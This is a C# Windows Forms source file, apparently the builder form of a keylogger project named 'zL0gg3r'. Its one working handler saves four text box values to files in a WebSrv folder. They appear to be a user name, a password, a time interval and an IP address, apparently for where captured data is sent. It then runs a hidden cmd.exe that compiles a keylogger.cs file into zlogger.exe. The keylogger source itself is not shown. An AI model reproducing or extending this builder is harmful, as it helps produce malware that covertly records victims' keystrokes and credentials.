using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.IO;

namespace zL0gg3r
{
    public partial class Form2 : Form
    {
        public Form2()
        {
            InitializeComponent();
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            StreamWriter sw1 = new StreamWriter(Application.StartupPath + "..\\..\\..\\WebSrv\\" + "user" + ".txt");
            sw1.WriteLine(textBox1.Text);
            sw1.Close();
            StreamWriter sw2 = new StreamWriter(Application.StartupPath + "..\\..\\..\\WebSrv\\" + "pass" + ".txt");
            sw2.WriteLine(textBox2.Text);
            sw2.Close();
            StreamWriter sw3 = new StreamWriter(Application.StartupPath + "..\\..\\..\\WebSrv\\" + "time" + ".txt");
            sw3.WriteLine(textBox3.Text);
            sw3.Close();
            StreamWriter sw4 = new StreamWriter(Application.StartupPath + "..\\..\\..\\WebSrv\\" + "ip" + ".txt");
            sw4.WriteLine(textBox4.Text);
            sw4.Close();

            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = "/C C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /t:exe /out:" + Application.StartupPath + "\\zlogger.exe " + Application.StartupPath + "..\\..\\..\\Temp\\keylogger.cs";
            process.StartInfo = startInfo;
            process.Start();
        }

        private void textBox4_TextChanged(object sender, EventArgs e)
        {

        }

        private void Form2_Load(object sender, EventArgs e)
        {

        }
    }
}
